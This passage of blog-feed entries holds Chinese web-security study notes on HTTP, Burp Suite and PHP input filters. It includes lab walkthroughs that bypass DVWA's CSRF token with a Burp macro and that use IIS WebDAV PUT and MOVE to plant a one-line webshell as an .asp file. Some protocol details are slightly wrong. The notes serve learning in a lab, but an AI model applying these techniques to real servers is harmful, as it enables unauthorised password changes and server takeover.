        <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>HTTP</code> 内容总结，及 <code>burpsuite</code> 软件的使用</p><a id="more"></a><!--export--><!--toc--><h3 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>无连接：限制每次连接只处理一个请求。服务器处理完客户的请求，并受到客户的应答后，即断开连接。以节省时间。</li><li>无状态：协议对于事物处理没有记忆能力，若后续处理前面的信息，则它必须重传。</li></ul><h4 id="HTTP之URL"><a href="#HTTP之URL" class="headerlink" title="HTTP之URL"></a>HTTP之URL</h4><p><code>URI</code> 是统一资源标识符，用来传输数据和建立连接。 <code>URL</code> 是一种特殊类型的 <code>URI</code> ，包含用于查找某个资源足够的信息。</p><p><code>URL</code> 是统一资源定位符，是互联网上用来标识某处资源的地址。</p><p><code>URL</code> 协议部分 域名部分 端口部分 虚拟目录部分 文件名部分 锚部分 参数部分</p><h4 id="HTTP请求和响应"><a href="#HTTP请求和响应" class="headerlink" title="HTTP请求和响应"></a>HTTP请求和响应</h4><p>请求消息：请求行、请求头部、空行和请求数据四部分组成。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/562f25980001b1b106000338.jpg</span> HTTP/1.1</span><br><span class="line">Host    img.mukewang.com</span><br><span class="line">User-Agent  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</span><br><span class="line">Accept  image/webp,image/*,*/*;q=0.8</span><br><span class="line">Referer http://www.imooc.com/</span><br><span class="line">Accept-Encoding gzip, deflate, sdch</span><br><span class="line">Accept-Language zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure><p><code>POST</code> 请求例子</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line"><span class="attribute">Host:www.wrox.com</span></span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line"><span class="attribute">Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Content-Length:40</span></span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure><p>响应消息：状态行、消息包头、空行和响应正文。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 22 May 2009 06:07:21 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;&lt;/head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">            &lt;!--body goes here--&gt;</span><br><span class="line">      &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h4><table><thead><tr><th>状态码</th><th>作用</th></tr></thead><tbody><tr><td>1xx</td><td>请求已接受，继续处理</td></tr><tr><td>2xx</td><td>请求已被成功接收、理解、接收</td></tr><tr><td>3xx</td><td>重定向</td></tr><tr><td>4xx</td><td>请求有语法错误或请求无法实现</td></tr><tr><td>5xx</td><td>服务器为能实现合法请求</td></tr></tbody></table><h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>GET</td><td>请求指定的页面信息，并返回实体主体</td></tr><tr><td>HEAD</td><td>返回响应中没有具体内容，用于获取报头</td></tr><tr><td>POST</td><td>向指定资源提交数据进行处理请求</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档内容</td></tr><tr><td>DELETE</td><td>请求服务器删除指定的页面</td></tr><tr><td>OPTION</td><td>允许客户端查看服务器的性能</td></tr><tr><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断</td></tr></tbody></table><p>浏览器地址输入 <code>URL</code> 后，经历流程：</p><ol><li>浏览器向 <code>DNS</code> 服务器请求解析该 <code>URL</code> 中的域名所对应的 <code>IP</code> 地址；</li><li>解析出 <code>IP</code> 地址后，根据 <code>IP</code> 地址和默认端口 <code>80</code> ，和服务器建立 <code>TCP</code> 连接；</li><li>浏览器发出读取文件的 <code>HTTP</code> 请求，该请求报文作为 <code>TCP</code> 三次握手的第三个报文数据发送给服务器。</li><li>服务器对浏览器请求作出响应，并把对应 <code>HTML</code> 文本发送给浏览器；</li><li>释放 <code>TCP</code> 连接；</li><li>浏览器将该 <code>HTML</code> 文本并显示内容。</li></ol><h4 id="GET和POST区别"><a href="#GET和POST区别" class="headerlink" title="GET和POST区别"></a>GET和POST区别</h4><p><code>GET</code> 请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/books/?sex=man&amp;name=Professional</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.wrox.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure><p><code>POST</code> 请求</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.wrox.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 40</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure><p>第一点：<code>GET</code> 提交，请求数据会附在 <code>URL</code> 之后，以 <code>?</code> 分割 <code>URL</code> 和传输数据，多个参数用 <code>&amp;</code> 连接。</p><p><code>POST</code> 提交，把提交数据放置在 <code>HTTP</code> 包的包体中；</p><p>第二点：<code>GET</code> 传输数据收到 <code>URL</code> 长度限制，<code>POST</code> 理论上不受限制；</p><p><em>参考文献</em></p><blockquote><p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="noopener">HTTP协议</a></p></blockquote><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><h4 id="burpsuite使用"><a href="#burpsuite使用" class="headerlink" title="burpsuite使用"></a>burpsuite使用</h4><p>关于软件的使用可以参考 <em><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">burpsuite实战指南</a></em> 一书。</p><h4 id="用burpsuite的宏绕过CSRF-TOKEN验证"><a href="#用burpsuite的宏绕过CSRF-TOKEN验证" class="headerlink" title="用burpsuite的宏绕过CSRF TOKEN验证"></a>用burpsuite的宏绕过CSRF TOKEN验证</h4><p>先打开 <code>firefox</code> 浏览器，登录账号，修改 <code>DVWA Security</code> 级别为 <code>High</code>。</p><p><img src="/images/54Highlevel.png" alt></p><p>然后进入到 <a href="http://192.168.253.133/dvwa/vulnerabilities/csrf/" target="_blank" rel="noopener">CSRF页面</a> </p><p><img src="/images/55csrfpage.png" alt></p><p>修改密码</p><p><img src="/images/56changepwd.png" alt></p><p>在 <code>HTTP history</code>中找到修改密码的请求包，发送到 <code>Repeater</code> 中，由于 <code>user_token</code> 已失效，密码修改失败， <code>HTTP</code> 状态码为 <code>302</code>，重定向到 <code>index.php</code> 页面。</p><p><img src="/images/58httphistory.png" alt></p><p><img src="/images/57repeaterFail.png" alt></p><p>接下来，开始使用宏绕过 <code>CSRF</code> 验证：</p><p><strong>第一步：录制宏</strong></p><p>在 <code>Project Option</code> 下 找到 <code>Sessions</code> ，然后找到底部的 <code>Macros</code> ，点击 <code>Add</code> 即创建一个新的宏。</p><p><img src="/images/59createNewMacros.png" alt></p><p>点击 <code>Add</code> 后会弹出一个新窗口</p><p><img src="/images/60macroRec.png" alt></p><p>在 <code>HTTP</code> 历史记录中选择 <code>/dvwa/vulnerabilities/csrf/</code> 在向应报文中找到 <code>user_token</code> 的值</p><p><img src="/images/61findtoken.png" alt></p><p>点击右下角 <code>OK</code> 后，进入 <code>Macro Editor</code> 界面</p><p><img src="/images/62macroEditor.png" alt> </p><p>修改 <code>Macro description</code> 为 <code>GET_CSRF_TOKEN</code> 点击右边 <code>Configure item</code></p><p><img src="/images/63item.png" alt></p><p><code>Parameter name</code> 改为 <code>user_token</code> 参数名与修改密码请求中的一致。用鼠标拖动选择 <code>user_token</code> 值，其余值会自动填充。点击 <code>OK</code> </p><p><img src="/images/64user_token.png" alt></p><p>完成后可以在宏列表中看到刚才录制的宏</p><p><img src="/images/65macroOK.png" alt></p><p><strong>第二步：添加会话处理规则</strong></p><p>完成后，在同一界面的 <code>Session Handling Rules</code> 点击 <code>Add</code> 弹出新界面</p><p><img src="/images/66session.png" alt></p><p>在新界面修改 <code>Rule Description</code> 为 <code>Update_CSRF_Token</code></p><p><img src="/images/67details.png" alt></p><p>点击 <code>Rule Actions</code> 选择 <code>GET_CSRF_TOKEN</code> ，然后选择 <code>Update only the following parameters</code> 选择 <code>user_token</code></p><p><img src="/images/68action.png" alt></p><p>选择好后，进入 <code>Session Handling</code> 选择 <code>Scope</code>界面，把修改密码的 <code>URL</code> 粘贴到 <code>URL Scope</code> 中</p><p><img src="/images/69scope.png" alt></p><p><strong>第三步：验证规则是否生效</strong></p><p>配置好后，返回到 <code>Repeater</code> 点击 <code>Go</code> 发现状态码 <code>200 OK</code></p><p><img src="/images/70200OK.png" alt></p><p>每点击一次，<code>user_tocken</code> 均不一样，密码可以修改成功。</p><p><img src="/images/71pwdChange.png" alt></p><p>后续进行宏维持会话有效</p><p><em>参考文献</em></p><blockquote><p><a href="https://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">经验分享|Burpsuite中宏的使用</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP - BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习8</title>
      <link href="/2019/08/20/practice8/"/>
      <url>/2019/08/20/practice8/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>HTTP</code> 协议和 <code>HTTPS</code>协议的异同点， <code>HTTP</code> 协议中常见头部字段信息的含义及 <code>IIS</code> <code>PUT</code>写权限漏洞学习报告。</p><a id="more"></a><!--export--><ol><li><p>描述 <code>HTTP</code> 协议和 <code>HTTPS</code> 协议的异同点</p><p>相同点：HTTP 和 HTTPS 都采用同一个基础的协议。HTTPS并非是一种新协议，只是HTTP通信接口部分用SSL和TLS协议代替而已。HTTPS就是身披SSL协议外壳的HTTP。</p><p>不同点</p><table><thead><tr><th>名称</th><th>不同点</th></tr></thead><tbody><tr><td>安全性</td><td>HTTP不安全，HTTPS安全；HTTP无需证书，无需加密，HTTPS需要证书需要加密</td></tr><tr><td>端口号</td><td>HTTP标准端口是80，HTTPS是443</td></tr><tr><td>所处层</td><td>HTTP工作与应用层，HTTPS工作与传输层</td></tr><tr><td>URL</td><td>HTTP以http://开头，HTTPS以https://开头</td></tr><tr><td>通信</td><td>HTTP直接和TCP通信，HTTPS写和SSL通信，再由SSL和TCP通信。</td></tr></tbody></table><p><em>参考文献</em></p><blockquote><p><a href="https://www.oschina.net/translate/http-vs-https-similarities-and-differences" target="_blank" rel="noopener">HTTP和HTTPS异同点</a></p><p>《图解HTTP》</p></blockquote></li></ol><ol start="2"><li><p>描述 <code>HTTP</code> 协议中，常见头部字段信息含义。</p><p><strong>请求首部字段</strong></p><table><thead><tr><th>请求首部字段</th><th>含义</th></tr></thead><tbody><tr><td>Accept</td><td>通知服务器，用户能够处理的媒体类型及媒体类型的相对优先级。</td></tr><tr><td>Accept-Charset</td><td>通知服务器用户代理支持的字符集及字符集的相对优先顺序。</td></tr><tr><td>Authorization</td><td>告知服务器，用户代理的认证信息。</td></tr><tr><td>Expect</td><td>告知服务器，期望出现的某种特定行为。</td></tr><tr><td>From</td><td>告知服务器使用用户代理的电子邮件地址。</td></tr><tr><td>Host</td><td>告知服务器，请求资源所处的互联网的主机名和端口号。</td></tr><tr><td>Proxy-Authorization</td><td>告知服务器认证所需要的信息。</td></tr><tr><td>Range</td><td>告知服务器资源的指定范围。</td></tr><tr><td>Referer</td><td>告知服务器请求的原始资源的URI</td></tr><tr><td>User-Agent</td><td>将创建请求的浏览器和用户代理名称等信息传达给服务器。</td></tr></tbody></table><p><strong>响应首部字段</strong></p><table><thead><tr><th>响应首部字段</th><th>含义</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</td></tr><tr><td>Age</td><td>告知客户端，源服务器在多久前创建了响应。</td></tr><tr><td>ETag</td><td>告知客户端实体标识。</td></tr><tr><td>Location</td><td>响应接收方引导至某个与请求URI位置不同的资源。</td></tr><tr><td>Proxy-Authenticate</td><td>由代理服务器所要求的认证信息发送给客户端。</td></tr><tr><td>Retry-After</td><td>告知客户端应该在多久之后再次发送请求。</td></tr><tr><td>Server</td><td>告知客户端当前服务器上安装的HTTP服务器应用程序的信息。</td></tr><tr><td>Vary</td><td>可对缓存进行控制。</td></tr><tr><td>WWW-Authenticate</td><td>用于HTTP访问认证。</td></tr></tbody></table></li><li><p><code>IIS</code> <code>put</code> 写权限漏洞</p><p>打开<code>VMware</code>虚拟机，先查看 <code>IP</code> 地址</p></li></ol><p><img src="/images/38Ipaddr.png" alt></p><p>​    主机访问网站</p><p><img src="/images/39show.png" alt></p><p>​        <code>WebDAV</code> 开启之前</p><p><img src="/images/40WebDaVClose.png" alt></p><p>​    使用 <code>burpsuite</code> 抓取数据包，将 <code>GET</code> 方法改为 <code>OPTIONS</code> 后，</p><p><img src="/images/41close.png" alt></p><p>​    开启 <code>WebDAV</code> 服务，</p><p><img src="/images/42open.png" alt></p><p>​    使用 <code>burpsuite</code> 抓取数据包，将 <code>GET</code> 方法改为 <code>OPTIONS</code> 后，</p><p><img src="/images/43openbp.png" alt></p><p>​    文件所在文件夹的写权限未开启前</p><p><img src="/images/44nowrite.png" alt></p><p>​    使用 <code>PUT</code> 写入文件</p><p><img src="/images/45fail.png" alt></p><p>​    文件所在文件夹的写权限开启</p><p><img src="/images/46write.png" alt></p><p>​    使用 <code>PUT</code> 写入文件</p><p><img src="/images/47success.png" alt></p><p>​    进入目录查看，可以找到 <code>test.txt</code> 文件</p><p><img src="/images/48testOK.png" alt></p><p>​    先将一句话木马写入 <code>test.txt</code> 中</p><p><img src="/images/49rom.png" alt></p><p>​        查看 <code>test.txt</code></p><p><img src="/images/50rom.png" alt></p><p>​    将 脚本资源访问 打上勾</p><p><img src="/images/51script.png" alt></p><p>​    在用 <code>MOVE</code> 将 <code>test.txt</code> 修改为 <code>test.asp</code></p><p> <img src="/images/52createAsp.png" alt></p><p>​    查看 <code>test.asp</code></p><p><img src="/images/53show.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note26</title>
      <link href="/2019/08/20/note26/"/>
      <url>/2019/08/20/note26/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 针对 <code>HTTP</code>的协议基础进行了简单的学习，掌握 <code>HTTP</code> 相关内容， 安装 <code>burpsuite</code> 软件，熟练使用该软件。对 <code>PDO</code>模式下防止 <code>SQL</code> 注入的理解。</p><a id="more"></a><!--export--><!--toc--><h3 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h3><h4 id="计算机网络模型基础"><a href="#计算机网络模型基础" class="headerlink" title="计算机网络模型基础"></a>计算机网络模型基础</h4><p><code>OSI</code> 模型总共分为七层，从下到上分别是：物理层、数据链路层、网络层、运输层、会话层、表示层和应用层。</p><p><code>TCP/IP</code> 模型分为五层，从下到上是：物理层、链路层、网络层、运输层和应用层。</p><ul><li><code>OSI</code>模型和 <code>TCP/IP</code> 模型</li></ul><table><thead><tr><th><code>OSI</code> 模型</th><th><code>TCP/IP</code> 模型</th><th>各层的解释</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>为应用程序提供服务</td></tr><tr><td>表示层</td><td>应用层</td><td>数据格式转化、数据加密</td></tr><tr><td>会话层</td><td>应用层</td><td>建立、管理和维护会话</td></tr><tr><td>传输层</td><td>传输层</td><td>建立、管理和维护端到端的连接</td></tr><tr><td>网络层</td><td>网络层</td><td><code>IP</code> 选址及路由选择</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>提供介质访问和链路管理</td></tr><tr><td>物理层</td><td>物理层</td><td>物理层</td></tr></tbody></table><ul><li>过程如下：</li></ul><ol><li>应用层数据，先按照运输层协议标准，封装到运输层数据里（数据段）；</li><li>接着运输层的数据，会按照网络层协议的标准，封装到网络层数据里（数据包/报文）；</li><li>接着这些数据包会按照链路层的协议标准，封装链路层数据里（帧）；</li><li>这些数据帧，按照物理层的电气特性，转换为网络中 <code>0101</code>比特流发送出去</li><li>网络会把这些流数据，不断地拆封再拆封，直到送到目标主机，然后由目标主机一层一层拆封数据，进行反解析，最终完成一次数据传递。</li></ol><table><thead><tr><th>层数</th><th>作用</th></tr></thead><tbody><tr><td>物理层</td><td>规定电气特性。如调制解调器、光导纤维等</td></tr><tr><td>数据链路层</td><td>有 <code>ARQ</code> 、<code>PPP</code>等协议，数据单元为帧，典型设备有：网卡/网桥/交换机</td></tr><tr><td>网络层</td><td>有<code>IP</code>/<code>ICMP</code>等协议，数据单元为数据包，典型设备为：路由器/防火墙/多层交换机</td></tr><tr><td>传输层</td><td>有<code>TCP</code>/<code>UDP</code>等协议，数据单元为数据段，典型设备有：进程和端口</td></tr><tr><td>应用层</td><td>有<code>DHCP</code>/<code>FTP</code>/<code>HTTP</code>等协议，典型设备有：应用程序(<code>FTP</code>/<code>SMTP</code>/<code>HTTP</code>)</td></tr></tbody></table><p>越往高走，越偏向软件化。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><code>HTTP</code> 协议是超文本传输（转移）协议，基于 <code>TCP/IP</code> 通信协议来传递数据，是一个属于应用层的面向对象的协议。</p><p> 常用状态码</p><table><thead><tr><th>状态码</th><th>意义</th></tr></thead><tbody><tr><td>200 OK</td><td>从客户端发来的请求在服务器端被正常处理</td></tr><tr><td>204 No Content</td><td>服务器接收的请求已成功处理，但在返回响应报文中不含实体的主体部分</td></tr><tr><td>301 Moved Permanently</td><td>永久性重定向</td></tr><tr><td>302 Found</td><td>临时性重定向</td></tr><tr><td>304 Not Modified</td><td>客户端发送附带条件请求时，服务器端允许请求访问资源，但未满足条件的情况</td></tr><tr><td>400 Bad Request</td><td>请求报文中存在语法错误</td></tr><tr><td>403 Forbidden</td><td>对请求资源的访问被服务器拒绝</td></tr><tr><td>404 Not Found</td><td>服务器上无法找到请求的资源</td></tr><tr><td>500 Internal Server Error</td><td>服务器端在执行请求时发生了错误</td></tr></tbody></table><h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h3><p>使用burpsuite抓取新闻管理系统的数据包</p><p>新闻初始界面</p><p><img src="/images/25bpindex.png" alt></p><p>点击 <code>forward</code></p><p><img src="/images/26bpindex.png" alt></p><p>点击用户界面</p><p><img src="/images/29bplogup.png" alt></p><p>注册成功后，登录</p><p><img src="/images/32bpjumpindex.png" alt></p><p>评论</p><p><img src="/images/33bpshowNews.png" alt></p><p>读取新闻</p><p><img src="/images/35bpreadNews.png" alt></p><p>进入个人信息页面</p><p><img src="/images/37bpPerInfo.png" alt></p><h3 id="PDO模式下防止SQL注入"><a href="#PDO模式下防止SQL注入" class="headerlink" title="PDO模式下防止SQL注入"></a>PDO模式下防止SQL注入</h3><p>使用 <code>PDO</code> 的 <code>prepare</code> 方式，主要是提高 <code>SQL</code> 模板查询性能、阻止 <code>SQL</code> 注入。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP内置过滤函数</title>
      <link href="/2019/08/17/php-file-func/"/>
      <url>/2019/08/17/php-file-func/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 本周写的新闻管理系统未对用户输入做出相应的判断，存在大量的漏洞，这篇文章特地总结了<code>php</code>内置过滤函数。</p><a id="more"></a><!--export--><h3 id="一、SQL注入过滤函数"><a href="#一、SQL注入过滤函数" class="headerlink" title="一、SQL注入过滤函数"></a>一、SQL注入过滤函数</h3><h4 id="1-addslashes"><a href="#1-addslashes" class="headerlink" title="1. addslashes()"></a>1. addslashes()</h4><p><strong>定义和用法</strong></p><p><code>addslashes(string)</code>函数返回在预定义的字符前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li><p>单引号(‘)</p></li><li><p>双引号(“)</p></li><li><p>反斜杠()</p></li><li><p>NULL</p></li></ul><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转移的字符串。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    $id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">    $str = addslashes($id);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/18addslashes.png" alt></p><h4 id="2-mysql-escape-string"><a href="#2-mysql-escape-string" class="headerlink" title="2. mysql_escape_string()"></a>2. mysql_escape_string()</h4><blockquote><p>在PHP5.3中已经弃用mysql_escape_string()</p></blockquote><p><code>mysql_escape_string()</code>并不转义<code>%</code>和<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">@$str = mysql_escape_string($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/19mysqlEscapeStr.png" alt></p><h4 id="3-mysql-real-escape-string"><a href="#3-mysql-real-escape-string" class="headerlink" title="3. mysql_real_escape_string()"></a>3. mysql_real_escape_string()</h4><p><strong>定义和用法</strong></p><p><code>mysql_real_escape_string(str, con)</code>函数转义SQL语句中使用的字符串中的特殊字符。</p><p>受影响的字符：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>若成功，返回被转义的字符串，否则，返回<code>false</code>。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转义的字符串。</td></tr><tr><td>connection</td><td>可选。规定MySQL连接。未规定，则使用上一个连接。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line"><span class="keyword">if</span>(@$str = mysql_real_escape_string($id))</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'false'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/20mysqlRealEscapeStr.png" alt></p><h3 id="二、XSS过滤函数"><a href="#二、XSS过滤函数" class="headerlink" title="二、XSS过滤函数"></a>二、XSS过滤函数</h3><h4 id="1-htmlspecialchars"><a href="#1-htmlspecialchars" class="headerlink" title="1. htmlspecialchars()"></a>1. htmlspecialchars()</h4><p><strong>定义和用法</strong></p><p><code>htmlspecialchars()</code>函数把预定义的字符转换成<code>HTML</code>实体。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = htmlspecialchars($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转义的字符串。</td></tr></tbody></table><p><img src="/images/21htmlspecialchars.png" alt></p><h4 id="2-strip-tag-函数"><a href="#2-strip-tag-函数" class="headerlink" title="2. strip_tag()函数"></a>2. strip_tag()函数</h4><p><strong>定义和用法</strong></p><p><code>strip_tags(string, allow)</code> 函数剥去字符串中的<code>HTML</code>、<code>XML</code> 以及<code>PHP</code>的标签。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr><tr><td>allow</td><td>可选。规定允许的标签。这些标签不会被删除。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = strip_tags($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/22stripTags.png" alt></p><h3 id="三、命令执行过滤函数"><a href="#三、命令执行过滤函数" class="headerlink" title="三、命令执行过滤函数"></a>三、命令执行过滤函数</h3><h4 id="1-escapeshellcmd"><a href="#1-escapeshellcmd" class="headerlink" title="1. escapeshellcmd()"></a>1. escapeshellcmd()</h4><p><strong>定义和用法</strong></p><p>在Windows下过滤方式是在字符前面加上一个^符号；在Linux是在字符前加上反斜杠（\）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = escapeshellcmd($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/23escapeshellcmd.png" alt></p><h4 id="2-escapeshellarg"><a href="#2-escapeshellarg" class="headerlink" title="2. escapeshellarg()"></a>2. escapeshellarg()</h4><p><strong>定义和用法</strong></p><p>给所有参数加上一对双引号，强制为字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 